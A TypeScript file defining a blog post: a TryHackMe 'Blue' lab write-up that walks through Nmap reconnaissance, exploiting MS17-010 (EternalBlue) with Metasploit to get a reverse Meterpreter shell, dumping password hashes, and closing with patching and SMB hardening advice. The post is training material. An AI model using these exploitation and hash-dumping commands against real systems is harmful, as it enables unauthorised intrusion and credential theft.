import type { BlogPost } from "@/lib/blog-types";

const post: BlogPost = {
  slug: "thm-blue-writeup",
  title: "TryHackMe: Blue - EternalBlue Exploitation",
  date: "2025-01-15",
  category: "ctf",
  tags: ["TryHackMe", "Windows", "EternalBlue", "Metasploit"],
  excerpt:
    "Complete walkthrough of exploiting MS17-010 vulnerability on TryHackMe's Blue machine. Learn how to identify and exploit this critical Windows SMB vulnerability.",
  readTime: "8 min",
  featured: true,
  content: `
## Introduction

The Blue machine on TryHackMe is a beginner-friendly Windows machine that demonstrates the infamous EternalBlue (MS17-010) vulnerability. This vulnerability was used in the WannaCry ransomware attack and remains one of the most critical Windows vulnerabilities discovered.

## Reconnaissance

First, let's start with an Nmap scan to identify open ports and services:

\`\`\`bash
nmap -sC -sV -oN nmap/initial 10.10.x.x
\`\`\`

The scan reveals several interesting ports:
- Port 135: MSRPC
- Port 139: NetBIOS-SSN
- Port 445: SMB (Microsoft-DS)
- Port 3389: RDP

## Vulnerability Assessment

With SMB open on port 445, let's check for the EternalBlue vulnerability:

\`\`\`bash
nmap --script smb-vuln-ms17-010 -p 445 10.10.x.x
\`\`\`

The script confirms the target is vulnerable to MS17-010!

## Exploitation

We'll use Metasploit to exploit this vulnerability:

\`\`\`bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set LHOST tun0
run
\`\`\`

After successful exploitation, we get a Meterpreter shell with SYSTEM privileges.

## Post-Exploitation

With SYSTEM access, we can dump password hashes:

\`\`\`bash
hashdump
\`\`\`

And retrieve the flags located in the user directories.

## Lessons Learned

1. Always keep systems patched - MS17-010 was patched in March 2017
2. Disable SMBv1 when possible
3. Implement network segmentation to limit lateral movement
4. Monitor for unusual SMB traffic patterns
  `,
};

export default post;
